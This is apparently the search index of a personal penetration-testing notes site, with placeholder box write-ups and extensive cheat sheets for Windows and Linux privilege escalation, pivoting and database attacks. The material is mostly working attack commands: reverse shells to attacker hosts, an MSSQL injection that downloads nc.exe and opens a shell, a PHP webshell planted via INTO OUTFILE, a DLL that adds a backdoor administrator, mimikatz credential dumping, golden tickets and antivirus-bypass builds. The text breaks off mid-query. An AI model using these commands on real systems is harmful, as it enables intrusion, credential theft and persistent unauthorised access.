{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"HOME","text":"<p>This site is both a journal and a reference.</p> <p>\ud83d\udee0\ufe0f Commands, tools &amp; cheatsheets</p> <p>\ud83c\udf10 Learning resources</p> <p>\ud83e\uddea Experiments &amp; projects</p> <p>Thanks for visiting!</p>"},{"location":"books/","title":"Index","text":"<p>Thoughts and takeaways from books I\u2019ve read \u2014 from tech to fiction.</p> <p>Stay tuned for:</p> <ul> <li>\ud83d\udcd8 1984 by George Orwell</li> <li>\ud83d\udcbc The Phoenix Project</li> <li>\ud83e\uddea Applied Cybersecurity Reads</li> </ul>"},{"location":"box-writeup/htb/","title":"HTB Box Writeups","text":"Box Difficulty OS Initial Foothold Privesc Method Time Taken Takeaways Notes ExampleBox1 Medium Linux HTTP file upload Sudo misconfig 2 hours File upload abuse, sudo GTFOBins - ExampleBox2 Hard Windows SMB null session Token impersonation 3 hours Pass-the-Hash, SeImpersonatePrivilege - ExampleBox3 Easy Linux FTP anonymous SUID binary abuse 1.5 hours FTP enumeration, SUID exploitation -"},{"location":"box-writeup/htb/examplebox1/","title":"ExampleBox1 (HTB)","text":"<ul> <li>Difficulty: Medium</li> <li>OS: Linux</li> <li>Time Taken: 2 hours</li> </ul> <p>Enumeration: - Ports: 22, 80 - Tools: Nmap, Gobuster</p> <p>Exploitation: - SSH login with found creds. - Privilege escalation via SUID binary.</p> <p>Flags: - User: <code>xxxxxx</code> - Root: <code>xxxxxx</code></p>"},{"location":"box-writeup/htb/examplebox2/","title":"ExampleBox2 (HTB)","text":"<ul> <li>Difficulty: Hard</li> <li>OS: Windows</li> <li>Time Taken: 3 hours</li> </ul> <p>Enumeration: - Ports: 135, 445, 3389 - Tools: Nmap, SMB enumeration</p> <p>Exploitation: - RDP login with found creds. - Mimikatz for password extraction.</p> <p>Flags: - User: <code>yyyyy</code> - Root: <code>yyyyy</code></p>"},{"location":"box-writeup/htb/examplebox3/","title":"ExampleBox3 (HTB)","text":"<ul> <li>Difficulty: Easy</li> <li>OS: Linux</li> <li>Time Taken: 1.5 hours</li> </ul> <p>Enumeration: - Ports: 22, 80 - Tools: Nmap, Gobuster</p> <p>Exploitation: - SSH login with found creds. - Privilege escalation via SUID binary.</p> <p>Flags: - User: <code>zzzz</code> - Root: <code>zzzz</code></p>"},{"location":"box-writeup/offsec/pg-play/","title":"PG Play Writeups","text":""},{"location":"box-writeup/offsec/pg-practice/","title":"PG Practice Writeups","text":""},{"location":"box-writeup/thm/","title":"TryHackMe Writeups","text":""},{"location":"pentest/cheatsheet/enumeration/linux/","title":"Linux","text":"<p>FOOTHOLD</p> <pre><code>whoami ; id; cat ~/.bash_history\necho $PATH\nsu -\nsudo -l\nls -ld /etc/{passwd,shadow,sudoers}\nfor user in $(cat /etc/passwd | grep -i '/bin/.*sh' | awk -F: '{print $1}');do echo \"$user\" ; id \"$user\";done\nfind / -perm -4000 -type f 2&gt;/dev/null\n/usr/sbin/getcap -r / 2&gt;/dev/null\nenv\ncrontab -l\nls -lah /etc/cron*  \nw\nuname -a\ncat /etc/*-release\nlscpu | grep -i 'arch\\|op-mode\\|byte'\nnetstat -ano ss -antp\nls -la\nls -la /\ncd /home &amp;&amp; find -maxdepth 3 -type d -ls\nls -la /{opt,tmp,var/www,var/www/html}\n</code></pre> <p>Automated Tools</p> <pre><code>linpeas.sh\n./pspy64 -pf -i 1000 \nlinux exploit suggester les.sh\n</code></pre>"},{"location":"pentest/cheatsheet/enumeration/windows/","title":"Windows","text":"<pre><code>nxc smb &lt;TARGET_IP&gt; --pass-pol\nnxc smb &lt;TARGET_IP&gt; -u 'guest' -p '' --rid-brute\nimpacket-lookupsid anonymous:@&lt;TARGET_IP&gt; | cut -d \" \" -f 2 &gt; usernames.txt\nimpacket-lookupsid guest@&lt;TARGET_IP&gt; -no-pass\nkerbrute userenum --dc &lt;DC_DOMAIN&gt; -d &lt;DOMAIN&gt; /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt\n\n./username-anarchy --input-file ~/ws/pgpractice/prep3/nagoya/users.txt &gt;&gt; ~/ws/pgpractice/prep3/nagoya/updated_users.txt\nkerbrute userenum -d nagoya-industries.com updated_users.txt --dc 192.168.109.21 | awk '{print $7}' | cut -d '@' -f 1 &gt; users.txt\n\ncewl &lt;IP&gt; -d 5 -w cewl_wordlist.txt\n</code></pre> <p>FOOTHOLD</p> <pre><code>wmic /node:localhost /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname\nwhoami /all\ncmdkey /list\nfindstr /SIM /C:\"pass\" *.ini *.cfg *.config *.conf *.xml *.json *.txt *.doc *.docx *.xls *.xlsx *.pdf\nfindstr /SIM /C:\"password\" *.ini *.cfg *.config *.conf *.xml *.json *.txt *.doc *.docx *.xls *.xlsx *.pdf\nfindstr /SIM /C:\"key\" *.ini *.cfg *.config *.conf *.xml *.json *.txt *.doc *.docx *.xls *.xlsx *.pdf\nnet user\nnet user &lt;USER&gt;\nnet user /domain\nnet user &lt;USER&gt; /domain\nnet localgroup administrators\nnet localgroup administrators /domain\nsysteminfo\nGet-ChildItem -Recurse -Depth 4 C:\\users | Select FullName\ncmd.exe /c dir /a C:\\\nls \"C:\\Program Files\"\nls \"C:\\Program Files (x86)\"\nicacls \"C:\\Program Files\\*\" 2&gt;nul | findstr \"(F)\" | findstr \"Everyone\"\nicacls \"C:\\Program Files (x86)\\*\" 2&gt;nul | findstr \"(F)\" | findstr \"Everyone\"\nicacls \"C:\\Program Files\\*\" 2&gt;nul | findstr \"(F)\" | findstr \"BUILTIN\\Users\"\nicacls \"C:\\Program Files (x86)\\*\" 2&gt;nul | findstr \"(F)\" | findstr \"BUILTIN\\Users\" \nicacls \"C:\\Program Files\\*\" 2&gt;nul | findstr \"(M)\" | findstr \"Everyone\"\nicacls \"C:\\Program Files (x86)\\*\" 2&gt;nul | findstr \"(M)\" | findstr \"Everyone\"\nicacls \"C:\\Program Files\\*\" 2&gt;nul | findstr \"(M)\" | findstr \"BUILTIN\\Users\" \nicacls \"C:\\Program Files (x86)\\*\" 2&gt;nul | findstr \"(M)\" | findstr \"BUILTIN\\Users\" \naccesschk.exe -qwsu \"Everyone\" *\naccesschk.exe -qwsu \"Authenticated Users\" *\naccesschk.exe -qwsu \"Users\" *\nnetstat -ano\n</code></pre> <p>Automated Tools</p> <pre><code>winpeas\npowerup\nlazagne\nprivesccheck\nwindows exploit suggester\nbloodhound/sharphound\n</code></pre>"},{"location":"pentest/cheatsheet/pivot/chisel/","title":"Chisel","text":""},{"location":"pentest/cheatsheet/pivot/chisel/#on-kali","title":"On KALI","text":"<pre><code>./chisel server -p 8000 --reverse\n2025/07/29 22:23:52 server: Reverse tunnelling enabled\n2025/07/29 22:23:52 server: Fingerprint rug5M0FUKx9SxDYDEV3Vzq6cpEqbjiBm/lxOISEh6P4=\n2025/07/29 22:23:52 server: Listening on http://0.0.0.0:8000\n</code></pre>"},{"location":"pentest/cheatsheet/pivot/chisel/#on-target","title":"On TARGET","text":"<pre><code>C:\\Users\\Christopher.Lewis\\Documents&gt; .\\chisel.exe client 192.168.45.162:8000 R:socks\n...\n2025/07/29 19:24:24 client: Connected (Latency 10.7826ms)\n</code></pre> <p>Note:  - Edit <code>/etc/proxychains4.conf</code> - Attach <code>proxychains</code> in commands  </p>"},{"location":"pentest/cheatsheet/pivot/ligolo/","title":"Ligolo","text":""},{"location":"pentest/cheatsheet/pivot/ligolo/#setup","title":"SETUP","text":"<pre><code>sudo ip tuntap add user kali mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert # Use self-signed certificates\n./agent -connect &lt;ATTACKER_IP&gt;:11601 -ignore-cert\n\nSELECT SESSION\nstart\n\nsudo ip route add &lt;IP&gt;/&lt;CIDR&gt; dev ligolo\nsudo ip route add 240.0.0.1/32 dev ligolo\n\nlistener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp\n\nnc -e &lt;MACHINE A IP&gt; &lt;PORT&gt;\nnc -e &lt;MACHINE A IP&gt; 30000\n\nsudo ip link delete ligolo\n</code></pre>"},{"location":"pentest/cheatsheet/postex/bypass_av/","title":"AV/EDR Bypass","text":""},{"location":"pentest/cheatsheet/postex/bypass_av/#go","title":"<code>go</code>","text":"<pre><code>git clone https://github.com/daniellowrie/update_script\ngo build SecUp.go\n./SecUp &lt;ATTACKER_IP&gt;\nrlwrap nc -lvnp &lt;PORT&gt;\nGOOS=windows go build update_script.go\nUpload executable file to TARGET and run\n</code></pre>"},{"location":"pentest/cheatsheet/postex/bypass_av/#nim","title":"<code>Nim</code>","text":"<pre><code>sudo apt install mingw-w64\ncurl https://nim-lang.org/choosenim/init.sh -sSf | sh\nexport PATH=\"$HOME/.nimble/bin:$PATH\"\ngit clone https://github.com/Sn1r/Nim-Reverse-Shell.git\nEdit `.nim` file\nnim c -d:mingw --app:gui rev_shell.nim\nUpload the compiled executable to start and setup listener\n</code></pre>"},{"location":"pentest/cheatsheet/postex/lpex/","title":"Linux","text":"<ul> <li> Check ROOT directory</li> <li> Rerun automated tools (linpeas, pspy)</li> </ul>"},{"location":"pentest/cheatsheet/postex/windows/creddump/","title":"Credential Dump","text":""},{"location":"pentest/cheatsheet/postex/windows/creddump/#secretsdump","title":"secretsdump","text":"<pre><code>impacket-secretsdump &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;TARGET_IP&gt;\nimpacket-secretsdump administrator.htb/ethan:limpbizkit@10.10.11.42\n</code></pre>"},{"location":"pentest/cheatsheet/postex/windows/creddump/#mimikatz","title":"mimikatz","text":"<pre><code>.\\mimikatz.exe \"privilege::debug\" \"logs\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"lsadump::sam\" \"exit\"\n</code></pre>"},{"location":"pentest/cheatsheet/postex/windows/goldtix/","title":"Golden Tickets","text":"<pre><code>.\\mimikatz.exe \nprivilege::debug \nlsadump::lsa /patch\nkerberos::purge\nlsadump::lsa /inject /name:krbtgt \nkerberos::golden /User:&lt;USERNAME&gt; /domain:&lt;DOMAIN&gt; /sid:&lt;SID&gt; /krbtgt:&lt;KRBTGT HASH&gt; /id:500 /ptt\n</code></pre>"},{"location":"pentest/cheatsheet/postex/windows/shadowcopy/","title":"Shadow Copy","text":"<pre><code>vshadow.exe -nw -p C:\ncopy &lt;SHADOW_DEVICE_NAME&gt;\\windows\\ntds\\ntds.dit C:\\ntds.dit.bak\ncopy &lt;SHADOW_DEVICE_NAME&gt;\\Windows\\System32\\config\\SYSTEM C:\\system.bak\nimpacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL\n</code></pre>"},{"location":"pentest/cheatsheet/privesc/linux/checklist/","title":"Checklist","text":"<ul> <li> Automated Tools</li> <li> Common Misconfiguration<ul> <li> Sudo Privileges</li> <li> Suid Privileges</li> <li> Capabilities on binaries  </li> <li> Exposed Credentials  </li> <li> Exposed Keys</li> <li> Scheduled Tasks  </li> <li> Writable <code>/etc</code> files</li> <li> Writable systemd service</li> <li> World-writable files or directories</li> <li> Writable directories in $PATH </li> <li> NFS root squash </li> </ul> </li> <li> Kernel Exploit</li> </ul>"},{"location":"pentest/cheatsheet/privesc/windows/checklist/","title":"Checklist","text":"<ul> <li> Automated Tools</li> <li> Common Misconfiguration<ul> <li> GPP Password Extraction  </li> <li> UAC Bypass  </li> <li> Token Privileges  </li> <li> DLL Hijacking</li> <li> AlwaysInstallElevated Enabled  </li> <li> Credential Dumping (LSASS, SAM, etc.)</li> </ul> </li> <li> Insecure Permissions  <ul> <li> Services</li> <li> Files and Folders</li> <li> Registry Keys</li> <li> Unquoted Service Paths</li> <li> Insecure Scheduled Tasks  </li> </ul> </li> <li> Kernel Exploit</li> </ul>"},{"location":"pentest/cheatsheet/privesc/windows/dllhijack/","title":"DLL Hijack","text":""},{"location":"pentest/cheatsheet/privesc/windows/dllhijack/#generate-reverse-shell-for-dll","title":"Generate reverse shell for <code>.dll</code>","text":"<pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;TARGET_IP&gt; LPORT=&lt;PORT&gt; -f dll -o rev.dll\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.38.79 LPORT=53 -f dll -o rev.dll\n</code></pre> <p>Upload <code>.dll</code> and trigger its execution</p>"},{"location":"pentest/cheatsheet/privesc/windows/dllhijack/#create-user-dll-script","title":"Create User <code>.dll</code> script","text":"<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;windows.h&gt;\n\nBOOL APIENTRY DllMain(\nHANDLE hModule,// Handle to DLL module\nDWORD ul_reason_for_call,// Reason for calling function\nLPVOID lpReserved ) // Reserved\n{\n    switch ( ul_reason_for_call )\n    {\n        case DLL_PROCESS_ATTACH: // A process is loading the DLL.\n        int i;\n        i = system (\"net user HackingT1me Password123@! /add\");\n        i = system (\"net localgroup administrators HackingT1me /add\");\n        break;\n        case DLL_THREAD_ATTACH: // A process is creating a new thread.\n        break;\n        case DLL_THREAD_DETACH: // A thread exits normally.\n        break;\n        case DLL_PROCESS_DETACH: // A process unloads the DLL.\n        break;\n    }\n    return TRUE;\n}\n</code></pre> <p>Cross-compile the code according to the target machine specification</p> <pre><code>x86_64-w64-mingw32-gcc -shared -o backdoor.dll &lt;SCRIPT&gt;\ni686-w64-mingw32-gcc -shared -o backdoor.dll &lt;SCRIPT&gt;\n</code></pre> <p>Use g++ for C++ code</p> <p>Upload <code>.dll</code> and trigger its execution</p>"},{"location":"pentest/cheatsheet/privesc/windows/gpp/","title":"Group Policy Preferences (GPP)","text":""},{"location":"pentest/cheatsheet/privesc/windows/gpp/#gpp-password-attack","title":"GPP password attack","text":"<p>Locate <code>Groups.xml</code> file and extract <code>cpassword</code></p> <pre><code>cat 'C:\\ProgramData\\Microsoft\\Group Policy\\History\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Machine\\Preferences\\Groups\\Groups.xml'\n</code></pre> <p>Decrypt <code>cpassword</code></p> <pre><code>gpp-decrypt 'CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74K eUWc2+BeOVDQ'\nMyUnclesAreMarioAndLuigi!!1!\n</code></pre>"},{"location":"pentest/cheatsheet/privesc/windows/scheduledtasks/","title":"Scheduled Tasks","text":"<p>List all scheduled tasks</p> <pre><code>schtasks /query /fo LIST /v\n</code></pre> <pre><code>icacls &lt;FILE&gt;\n</code></pre> <p>Replace the file with a malicious one and wait</p>"},{"location":"pentest/cheatsheet/privesc/windows/unquotedservicepaths/","title":"Unquoted Service Paths","text":"<p>List services with spaces and missing quotes in binary path</p> <pre><code>wmic service get name,pathname |  findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\"\npowershell -ep bypass\n. .\\PowerUp.ps1\nGet-UnquotedService\n</code></pre> <p>Check permissions to the service</p> <pre><code>sc qc &lt;SERVICE&gt;\naccesschk.exe /accepteula -uwdq &lt;PATH&gt;\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;TARGET_IP&gt; LPORT=&lt;PORT&gt; -f exe -o rev.exe\nmsfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe\n</code></pre> <p>Start the service</p> <pre><code>net start &lt;SERVICE&gt;\nstart-service &lt;SERVICE&gt;\nsc start &lt;SERVICE&gt;\n</code></pre>"},{"location":"pentest/cheatsheet/privesc/windows/kernel/exp/","title":"Kernel Exploits","text":"<p>Get SYSTEM information, hotfixes and run wes</p> <pre><code>systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"Processor(s)\" /C:\"System Locale\" /C:\"Input Locale\" /C:\"Domain\" /C:\"Hotfix(s)\"\nwmic qfe get Caption,Description,HotFixID,InstalledOn\npython wes.py &lt;SYSTEM_INFO&gt;\n</code></pre>"},{"location":"pentest/cheatsheet/privesc/windows/registry/alwaysinstallelevated/","title":"AlwaysInstallElevated","text":"<p>Query for AlwaysInstallElevated registry key</p> <pre><code>reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated  \nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n</code></pre> <p>Run the installer </p> <pre><code>msiexec /quiet /qn /i &lt;PATH_TO_.msi&gt;\nmsiexec /quiet /qn /i C:\\Users\\dev-datasci-lowpriv\\Downloads\\rev.msi\n</code></pre>"},{"location":"pentest/cheatsheet/privesc/windows/registry/autorun/","title":"AutoRun","text":"<p>Query the registry for AutoRun executables</p> <pre><code>reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n\naccesschk.exe /accepteula -wvu &lt;FILE&gt;\naccesschk.exe /accepteula -wvu \"C:\\Program Files\\Autorun Program\\program.exe\"\nicacls &lt;FILE&gt;\n</code></pre>"},{"location":"pentest/cheatsheet/privesc/windows/registry/storedcred/","title":"StoredCredentials","text":"<p>List registries that have keys or values that contain the word <code>password</code></p> <pre><code>reg query HKCU /f password /t REG_SZ /s\nreg query HKLM /f password /t REG_SZ /s\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\winlogon\"\nreg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\"\nreg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\"\nreg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\"\n</code></pre>"},{"location":"pentest/cheatsheet/privesc/windows/token/sebackup/","title":"sebackup","text":"<pre><code>reg save HKLM\\SAM SAM\nreg save HKLM\\SYSTEM SYSTEM\nimpacket-secretsdump -sam SAM -system SYSTEM LOCAL\n</code></pre>"},{"location":"pentest/cheatsheet/privesc/windows/token/sedebug/","title":"sedebug","text":""},{"location":"pentest/cheatsheet/privesc/windows/token/sedebug/#psgetsystem","title":"psgetsystem","text":"<pre><code>. .\\psgetsys.ps1 \n\nImpersonateFromParentPid -ppid &lt;parentpid&gt; -command &lt;command to execute&gt; -cmdargs &lt;command arguments&gt;\nImpersonateFromParentPid -ppid 612 -command \"C:\\Windows\\System32\\cmd.exe\" -cmdargs \"\"\n</code></pre>"},{"location":"pentest/cheatsheet/privesc/windows/token/sedebug/#sedebugprivilegeexe","title":"SeDebugPrivilege.exe","text":"<pre><code>SeDebugPrivesc.exe &lt;PID&gt; &lt;Program and Arguments&gt;\n</code></pre>"},{"location":"pentest/cheatsheet/privesc/windows/token/seimpersonate/","title":"seimpersonate","text":"<p>Check token privileges</p> <pre><code>whoami /priv\n</code></pre> <p>PrintSpoofer</p> <pre><code>.\\PrintSpoofer64.exe -c \"nc.exe &lt;ATTACKER_IP&gt; &lt;PORT&gt; -e cmd\"\n.\\PrintSpoofer64.exe -i -c powershell.exe\n.\\PrintSpoofer64.exe -c rev.exe -i\n</code></pre> <p>SharpEfsPotato</p> <pre><code>.\\SharpEfsPotato.exe -p rev.exe\n</code></pre> <p>GodPotato</p> <pre><code>reg query \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\"\nGodPotato.exe -cmd \"C:\\Users\\Public\\reverse.exe\"\nGodPotato.exe -cmd \"net user /add backdoor Password123\"\nGodPotato.exe -cmd \"net localgroup administrators /add backdoor\"\nRunasCs.exe backdoor Password123 \"C:/Users/Public/rev.exe\" --force-profile --logon-type 8\n</code></pre>"},{"location":"pentest/cheatsheet/privesc/windows/token/seloaddriver/","title":"Seloaddriver","text":"<p>SeLoadDriver</p> <p>TODO</p>"},{"location":"pentest/cheatsheet/privesc/windows/token/semanagevolume/","title":"semanagevolume","text":"<p>SeManageVolumeExploit.exe</p>"},{"location":"pentest/cheatsheet/privesc/windows/token/semanagevolume/#printconfigdll","title":"Printconfig.dll","text":"<pre><code>C:\\Windows\\System32\\spool\\drivers\\x64\\3\\Printconfig.dll\n\n$type = [Type]::GetTypeFromCLSID(\"{854A20FB-2D44-457D-992F-EF13785D2B51}\")\n$object = [Activator]::CreateInstance($type)\n</code></pre>"},{"location":"pentest/cheatsheet/privesc/windows/token/semanagevolume/#tzresdll","title":"tzres.dll","text":"<pre><code>C:\\Windows\\System32\\wbem\\tzres.dll\n\nsysteminfo\n</code></pre>"},{"location":"pentest/cheatsheet/privesc/windows/token/semanagevolume/#phoneinfodll","title":"phoneinfo.dll","text":"<pre><code>C:\\Windows\\System32\\phoneinfo.dll\nC:\\Windows\\System32\\Report.wer\nC:\\Windows\\System32\\WerTrigger.exe\n\nWerTrigger.exe\n</code></pre>"},{"location":"pentest/cheatsheet/privesc/windows/token/serestore/","title":"serestore","text":"<pre><code>.\\SeRestoreAbuse.exe \"cmd /c C:\\Users\\anirudh\\Documents\\nc.exe -e cmd.exe 192.168.45.246 3000\"\n.\\SeRestoreAbuse.exe \"C:\\Users\\svc_apache$\\Documents\\rev.exe\"\n</code></pre> <pre><code>mv C:\\Windows\\System32\\utilman.exe C:\\Windows\\System32\\utilman.bak\nmv C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe\n\nrdesktop\n\nWIN + U\n</code></pre>"},{"location":"pentest/cheatsheet/rev_shells/common/","title":"Common","text":"<pre><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1\nbash -c 'bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1'\n</code></pre> <pre><code>nc -e /bin/sh 10.0.0.1 1234\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f\n</code></pre>"},{"location":"pentest/cheatsheet/rev_shells/uncommon/","title":"Uncommon","text":"<pre><code>exec /bin/bash 0&amp;0 2&gt;&amp;0\n\n0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196\n\nexec 5&lt;&gt;/dev/tcp/attackerip/4444  \ncat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done\u00a0 # or:  \nwhile read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done\n</code></pre> <pre><code>busybox nc 10.10.10.10 1234 -e sh\n</code></pre>"},{"location":"pentest/coding/bash/pitfalls/","title":"bash","text":""},{"location":"pentest/coding/bash/pitfalls/#references","title":"References","text":"<ul> <li>Bash pitfalls</li> </ul>"},{"location":"pentest/enumeration/nmap/","title":"Nmap","text":"<pre><code>nmap \"$IP\"\n</code></pre> <p>TCP all port scan</p> <pre><code>nmap \"$IP\" -p- --open -sC -sV -oA nmap/full_scan\n</code></pre> <p>UDP scan</p> <pre><code>nmap \"$IP\" -sU --open --top-ports=100 -oA nmap/udp_scan\n</code></pre> <p>Script scan (vuln)</p> <pre><code>nmap \"$IP\" --script vuln\n</code></pre>"},{"location":"pentest/enumeration/databases/mariadb/","title":"Mariadb","text":"<pre><code>mariadb -h &lt;IP&gt; -u &lt;USERNAME&gt; -ppassword &lt;PASSWORD&gt;\nmariadb -h &lt;IP&gt; -u root\n</code></pre>"},{"location":"pentest/enumeration/databases/mongodb/","title":"Mongodb","text":"<p>Installation of <code>mongosh</code></p> <pre><code>wget https://downloads.mongodb.com/compass/mongodb-mongosh_2.1.1_amd64.deb\n\nsudo dpkg -i mongodb-mongosh_2.1.1_amd64.deb  \n</code></pre> <p>Connect to <code>mongo</code></p> <pre><code>mongosh mongodb://&lt;TARGET_IP&gt;:27017\n</code></pre> <p>Mongo commands</p> <pre><code>show tables;\nshow dbs;\nuse &lt;DATABASE_NAME&gt;;\ndb.&lt;collection_name&gt;.find();\n</code></pre> <p>Overwriting credentials</p> <pre><code>mkpasswd -m sha-512 Password1234\nmongo --port &lt;PORT&gt; &lt;DATABASE&gt; --eval 'db.&lt;COLLECTION&gt;.update({\"_id\": ObjectId(\"&lt;OBJECT_ID&gt;\")},{$set:{\"&lt;FIELD_NAME&gt;\":\"&lt;NEW_HASH&gt;\"}})'\nmongo --port &lt;PORT&gt; -u &lt;USERNAME&gt; -p &lt;NEW_PASSWORD&gt; --authenticationDatabase &lt;DATABASE_NAME&gt;\n</code></pre>"},{"location":"pentest/enumeration/databases/mssql/","title":"Mssql","text":""},{"location":"pentest/enumeration/databases/mssql/#connect-to-database","title":"Connect to Database","text":""},{"location":"pentest/enumeration/databases/mssql/#sqsh","title":"<code>sqsh</code>","text":"<pre><code>sqsh -S &lt;IP&gt; -U &lt;Username&gt; -P &lt;Password&gt; -D &lt;Database&gt;\n</code></pre>"},{"location":"pentest/enumeration/databases/mssql/#mssqlclient","title":"<code>mssqlclient</code>","text":"<pre><code>mssqlclient.py -windows-auth &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;\n</code></pre>"},{"location":"pentest/enumeration/databases/mssql/#commands","title":"Commands","text":"<pre><code>SELECT is_srvrolemember('sysadmin');\nSELECT DB_NAME()\nxp_cmdshell \"powershell -c pwd\"\n</code></pre> <p><code>xp_cmdshell</code> Configuration</p> <pre><code>impacket-mssqlclient Administrator:Lab123@192.168.228.18 -windows-auth\nSQL&gt; EXECUTE sp_configure 'show advanced options', 1;\nSQL&gt; RECONFIGURE; \nSQL&gt; EXECUTE sp_configure 'xp_cmdshell', 1;\nSQL&gt; RECONFIGURE;\nEXECUTE xp_cmdshell 'whoami';\n</code></pre>"},{"location":"pentest/enumeration/databases/mssql/#impersonation","title":"Impersonation","text":"<pre><code>SQL (HAERO\\discovery  guest@master)&gt; enum_impersonate\nexecute as   database   permission_name   state_desc   grantee          grantor          \n----------   --------   ---------------   ----------   --------------   --------------   \nb'LOGIN'     b''        IMPERSONATE       GRANT        HAERO\\services   hrappdb-reader\n\nSQL (HAERO\\discovery  guest@master)&gt; exec_as_login hrappdb-reader\nSQL (hrappdb-reader  guest@master)&gt; \n</code></pre>"},{"location":"pentest/enumeration/databases/mssql/#ntlm-hash-disclosure","title":"NTLM Hash disclosure","text":"<ul> <li> Enabled <code>xp_dirtree</code></li> </ul> <pre><code>exec xp_dirtree '\\\\&lt;IP&gt;\\&lt;SHARE&gt;\\',1,1\nxp_dirtree \\\\&lt;ATTACKER IP&gt;\\&lt;SHARE&gt;\n</code></pre>"},{"location":"pentest/enumeration/databases/mssql/#payload-injection","title":"Payload Injection","text":"<pre><code>'; EXEC sp_configure 'show advanced options',1 \nRECONFIGURE\n\nEXEC sp_configure 'xp_cmdshell',1 \nRECONFIGURE\n\nDECLARE @cmd1 varchar(600)\nDECLARE @cmd2 varchar(600)\n\nSET @cmd1 = 'certutil -urlcache -f http://192.168.45.224/nc.exe c:/windows/temp/nc.exe'\nEXEC xp_cmdshell @cmd1\n\nSET @cmd2 = ''EXEC xp_cmdshell \"C:/windows/temp/nc.exe 192.168.45.224 443 -e cmd.exe\"\nEXEC xp_cmdshell @cmd2\n;--\n</code></pre> <p>1) Test the username or password fields by adding a single quote('). If there's an error or strange behavior, it might indicate SQL injection.  2) Use time-based payloads to identify the database system.  3) Once the DB system is known, look for specific vulnerabilities to gain further access.  4) For MSSQL, check and enable xp_cmdshell if necessary including advanced options.</p>"},{"location":"pentest/enumeration/databases/mysql/","title":"Mysql","text":""},{"location":"pentest/enumeration/databases/mysql/#connect-to-database","title":"Connect to Database","text":"<pre><code>mysql -u &lt;TARGET_USER&gt; -p'&lt;PASSWORD&gt;' -h &lt;TARGET_IP&gt; -P 3306 --ssl-verify-server-cert=disabled\n</code></pre>"},{"location":"pentest/enumeration/databases/mysql/#commands","title":"Commands","text":"<pre><code>select * from sys.database_principals;\nSHOW GRANTS FOR CURRENT_USER;\nSHOW DATABASES;\nUSE &lt;DATABASE_NAME&gt;;\nSHOW TABLES;\nDESCRIBE &lt;TABLE_NAME&gt;;\nSELECT * FROM &lt;TABLE_NAME&gt;;\nUPDATE [table] SET [password_column] = '[new_password]' WHERE [user_identifier_column] = '[user_id]';\n</code></pre> <p>To load <code>.sql</code> file (Login to <code>MySQL</code>)</p> <pre><code>source &lt;.sql&gt;\n</code></pre>"},{"location":"pentest/enumeration/databases/mysql/#webshell-injection","title":"Webshell injection","text":"<pre><code>SELECT \"&lt;?php echo shell_exec($_GET['cmd']);?&gt;\" INTO OUTFILE \"/var/www/https/blogblog/wp-content/uploads/shell.php\";\n</code></pre>"},{"location":"pentest/enumeration/databases/mysql/#user-defined-function-udf-exploit","title":"User Defined Function (UDF) exploit","text":"<p>Check user privilege in MySQL (Read and Write Files!)</p> <pre><code>select * from mysql.user where user = substring_index(user(), '@', 1) ;\n</code></pre> <p>Check the architecture of MySQL and OS</p> <pre><code>select @@version_compile_os, @@version_compile_machine;\nshow variables like '%compile%';\n</code></pre> <p>Check the path of the MySQL plugin directory</p> <pre><code>SELECT @@plugin_dir;\nSHOW VARIABLES LIKE 'plugin%';\n</code></pre> <p>Note: In older versions you can upload the DLL file to the following locations and create new UDF functions. \u2022 @@datadir \u2022 @@basedir\\bin \u2022 C:\\windows \u2022 C:\\windows\\system \u2022 C:\\windows\\system32  </p>"},{"location":"pentest/enumeration/databases/mysql/#upload-a-binary-file","title":"Upload a binary file","text":""},{"location":"pentest/enumeration/databases/mysql/#direct-file-load-with-load_file-and-into-dumpfile","title":"Direct File Load with LOAD_FILE() and INTO DUMPFILE","text":"<pre><code>select load_file('\\\\\\\\192.168.0.19\\\\network\\\\lib_mysqludf_sys_64.dll') into dumpfile\n\"D:\\\\MySQL\\\\mysql-5.7.21-winx64\\\\mysql-5.7.21-winx64\\\\lib\\\\plugin\\\\udf.dll\";\n</code></pre>"},{"location":"pentest/enumeration/databases/mysql/#hex-encoded-dll-dump","title":"Hex-Encoded DLL Dump","text":"<pre><code>select 